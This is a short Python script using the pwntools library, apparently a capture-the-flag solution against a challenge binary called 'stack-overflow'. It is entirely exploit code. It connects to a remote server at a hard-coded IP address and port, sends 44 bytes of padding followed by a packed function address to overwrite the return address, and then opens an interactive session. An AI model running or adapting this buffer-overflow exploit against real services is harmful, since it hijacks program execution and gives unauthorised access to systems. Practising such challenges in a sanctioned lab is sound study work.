from pwn import *

#r = process('./stack-overflow')
r = remote('45.77.51.4', 8887)
r.recvuntil('name:')
padding = "A"*44 
some_function = 0x808a0fb
payload = padding + p32(some_function)
r.sendline(payload)
r.interactive()

